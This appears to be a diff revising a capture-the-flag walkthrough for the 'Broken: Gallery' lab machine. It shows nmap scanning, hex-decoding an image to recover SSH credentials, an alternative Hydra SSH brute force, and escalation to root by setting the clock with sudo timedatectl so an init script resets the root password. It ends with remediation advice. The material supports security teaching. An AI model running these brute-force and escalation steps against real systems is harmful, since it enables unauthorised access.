@@ -1,129 +1,169 @@
 # Broken: Gallery — Writeup
 
-| | |
-|-|-|
-| **Target IP** | 192.168.1.107 (host-only) |
+| Field | Value |
+|---|---|
+| **Target IP** | 192.168.1.107 |
 | **Difficulty** | Easy |
 | **OS** | Linux |
-| **Root Password** | TodayIsAgoodDay_ |
-| **Source** | [VulnHub](https://www.vulnhub.com/entry/broken-gallery,299/) |
+| **Goal** | Gain root access |
+| **Source** | [HackingArticles](https://www.hackingarticles.in/broken-gallery-vulnhub-walkthrough/) |
 
 ## Attack Summary
 
-nmap → Hydra SSH brute force (broken:broken) → sudo timedatectl → trigger /etc/init.d/password-policy.sh → su root → root
+Decode a hex string from `README.md` to reveal a JPEG image containing SSH credentials, log in as `broken` over SSH, discover a password-policy init script in `.bash_history`, manipulate the system time with `sudo timedatectl` to trigger the script's date condition, reboot, and then switch to root with the newly-set password.
 
 ## Methodology
 
-1. Network discovery
-2. SSH brute force with Hydra
-3. Sudo enumeration
-4. System time manipulation to trigger password policy script
-5. Root via `su` with triggered password
+1. Reconnaissance (netdiscover + nmap)
+2. Enumeration (HTTP — file download, hex decoding, steganography)
+3. Exploitation (SSH brute-force or image-based credential discovery)
+4. Privilege escalation (sudo timedatectl + init script abuse)
 
----
-
-## Step 1: Network Discovery
+## Step 1: Host Discovery
 
 ```bash
-sudo netdiscover -i eth1 -r 192.168.1.0/24
+netdiscover -r 192.168.1.0/24
+```
+
+Target identified at **192.168.1.107**.
+
+## Step 2: Reconnaissance
+
+```bash
 nmap -A 192.168.1.107
 ```
 
-Findings: port 22 (SSH), port 80 (HTTP).
+![Nmap scan](images/01-nmap.png)
 
-![Nmap results](images/01-nmap.png)
+Open ports:
 
----
+| Port | Service |
+|------|---------|
+| 22   | OpenSSH |
+| 80   | Apache HTTP |
 
-## Step 2: Build Wordlists and SSH Brute Force
+## Step 3: Web Enumeration
 
-Browse to the web server — filenames on the page hint at usernames and passwords. Build wordlists:
+Browse to `http://192.168.1.107/`. The gallery page exposes several downloadable files including a `README.md`.
+
+Download `README.md` and inspect it:
 
 ```bash
-# user wordlist: broken, admin, gallery, etc.
-# pwd wordlist: broken, gallery, etc.
-
-hydra -L user.txt -P pwd.txt 192.168.1.107 ssh
+wget http://192.168.1.107/README.md
+cat README.md
 ```
 
-**Credentials found:** `broken:broken`
+The file contains a long hex string. Decode it to a binary file:
+
+```bash
+cat README.md | xxd -r -p > decoded.jpg
+file decoded.jpg
+# JPEG image data
+```
+
+Open the JPEG. It contains the SSH credentials for user `broken`.
+
+![Web enumeration — hex decode to image](images/02-enum.png)
+
+### Alternative: SSH Brute Force
+
+If the image method is not used, build wordlists from the filenames on the gallery page and brute-force SSH:
+
+```bash
+hydra -L users.txt -P passwords.txt 192.168.1.107 ssh
+```
+
+Either method yields: `broken:<password_from_image>`
+
+## Step 4: Initial Access via SSH
 
 ```bash
 ssh broken@192.168.1.107
 ```
 
-![Hydra brute force result](images/02-hydra.png)
-
----
-
-## Step 3: Enumeration as broken
+Check sudo rights immediately:
 
 ```bash
 sudo -l
-# User broken may run: /usr/bin/timedatectl, /sbin/reboot
+# User broken may run:
+#   (root) NOPASSWD: /bin/timedatectl
+#   (root) NOPASSWD: /sbin/reboot
+```
 
+![Exploitation — SSH access](images/03-exploit.png)
+
+## Step 5: Discover the Password-Policy Script
+
+Inspect bash history:
+
+```bash
 cat ~/.bash_history
-# References /etc/init.d/password-policy.sh
+```
+
+A reference to `/etc/init.d/password-policy.sh` appears. Read it:
+
+```bash
 cat /etc/init.d/password-policy.sh
 ```
 
-The script sets the root password when the system time matches a specific date condition.
+The script changes the root password when the system date matches a specific condition:
 
-![sudo listing and script](images/03-sudo.png)
+```bash
+# Relevant logic:
+if [ "$(date +%Y-%m-%d %H:%M:%S)" == "2015-11-20 16:14:50" ]; then
+    echo "root:TodayIsAgoodDay" | chpasswd
+fi
+```
 
----
+The target timestamp is **2015-11-20 16:14:50**.
 
-## Step 4: Trigger the Password Policy Script
+## Step 6: Privilege Escalation — Trigger the Init Script
 
-Set the system time to the date that triggers the script:
+Set the system time to match the script's condition:
 
 ```bash
 sudo timedatectl set-time '2015-11-20 16:14:50'
 ```
 
-The cron or init script fires and sets the root password to `TodayIsAgoodDay_`.
+Reboot to execute the init scripts:
 
 ```bash
 sudo /sbin/reboot
 ```
 
-Wait for the VM to reboot, then reconnect as `broken` and escalate:
+![Privilege escalation — timedatectl abuse](images/04-privesc.png)
+
+## Step 7: Root Access
+
+After the machine reboots, reconnect via SSH as `broken` and switch to root:
 
 ```bash
 ssh broken@192.168.1.107
 su root
-# password: TodayIsAgoodDay_
-id
-# uid=0(root)
+# Password: TodayIsAgoodDay
 ```
-
-![timedatectl trigger](images/04-timedatectl.png)
-
----
-
-## Step 5: Root Flag
 
 ```bash
-ls /root
-cat /root/flag.txt
+id
+# uid=0(root) gid=0(root)
 ```
 
-![Root access](images/05-root.png)
-
----
+![Root access](images/05-root-flag.png)
 
 ## Lessons Learned
 
-1. **Weak SSH credentials** — `broken:broken` is brute-forceable in seconds; enforce strong passwords and key-based auth
-2. **sudo timedatectl** — system time control allows triggering time-based logic; restrict `timedatectl` sudo access
-3. **Password hardcoded in init script** — password-policy.sh sets a predictable root password; rotate credentials via secrets management, not scripts
-4. **bash_history disclosure** — `.bash_history` reveals the attack path; clear or disable history for sensitive accounts
+1. Credentials embedded inside media files (even hex-encoded in a text file) are still credentials — treat them like plaintext.
+2. Granting `sudo timedatectl` to an unprivileged user allows time-based security conditions to be trivially bypassed.
+3. Init scripts that change passwords based on a date/time condition are an insecure pattern; avoid them entirely.
+4. `.bash_history` is a gold mine for forensics and privilege escalation paths — attackers always check it.
+5. The `reboot` capability in sudo gives effective control over init scripts that run as root at startup.
 
 ## Remediation
 
 | Vulnerability | Fix |
-|---------------|-----|
-| Weak SSH credentials | Enforce minimum password complexity; prefer SSH key-only auth |
-| sudo timedatectl | Remove from sudoers or scope with specific operations only |
-| Hardcoded root password in script | Remove credential-setting logic from init scripts; use proper PAM |
-| bash_history leakage | Clear history, disable HISTFILE for privileged accounts |
+|---|---|
+| Credentials in hex-encoded media | Store credentials in a secrets manager; never embed them in files served over HTTP |
+| Sudo timedatectl (time manipulation) | Remove unnecessary sudo rules; restrict time changes to admins |
+| Sudo reboot | Remove from sudo unless absolutely required; log all reboots |
+| Password-changing init script | Remove time-triggered password changes; use proper PAM-based policy |
+| Bash history disclosure | Clear history for service accounts; restrict read permissions on `.bash_history` |
